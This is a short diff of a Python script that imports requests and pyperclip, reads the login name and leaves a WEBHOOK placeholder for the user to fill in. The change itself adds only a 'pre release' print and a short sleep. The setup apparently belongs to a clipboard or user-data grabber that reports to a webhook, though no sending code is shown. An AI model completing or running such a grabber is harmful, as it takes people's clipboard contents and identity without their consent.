@@ -1,7 +1,9 @@
 import os
 import requests
 import pyperclip
-
+import time
+print("this is pre release")
+time.sleep(0.3)
 WEBHOOK = "webhook" #put your here
 
 user = os.getlogin()
